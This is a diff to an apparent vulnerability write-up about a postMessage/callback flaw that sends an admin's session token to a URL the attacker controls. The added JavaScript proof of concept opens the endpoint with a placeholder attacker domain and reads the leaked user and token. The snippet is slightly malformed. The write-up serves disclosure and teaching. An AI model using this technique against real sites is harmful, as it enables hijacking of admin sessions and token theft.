@@ -133,10 +133,21 @@ We picked an attack path that’s annoyingly simple in practice. The idea: get a
 So the flow looked like this:
 
 1. Lure an admin (already logged into Website A) to the vulnerable page URL we control — the URL includes a `call_back` parameter that points to our domain.  
-2. The vulnerable site runs its JavaScript and sends a `postMessage` to the `callback` URL from the admin’s browser (authenticated context).  
-3. Our attacker page (on the `call_back` domain) receives the message and can grab whatever the site sent — in our case, admin tokens — because the message was sent from the admin’s logged-in browser session.
+2. The vulnerable site runs its JavaScript and sends a `postMessage` to the `call_back` URL from the admin’s browser (authenticated context).  
+3. Our attacker page (on the `call_back` domain) receives the message and can grab whatever the site sent — in our case, admin tokens — because the message was sent from the admin’s logged-in browser session
 
-In short: trick the admin’s browser into sending sensitive data to our listener by abusing the `call_back` query parameter.
+
+POC
+```js
+    window.open("https://<vulnerable_site.com>/get-active-user-session?call_back=<https://ourattackercontrolleddomain.com>");
+    window.addEventListener("message", function(e) {
+      if (e.origin == <vulnerable_site.com>) {
+        	alert(e.data.user);
+          alert( e.data.token);
+      }
+```
+
+In short: trick the admin’s browser into sending sensitive data to our listener by abusing the `call_back` query parameter, defeating SOP.
 
 
 
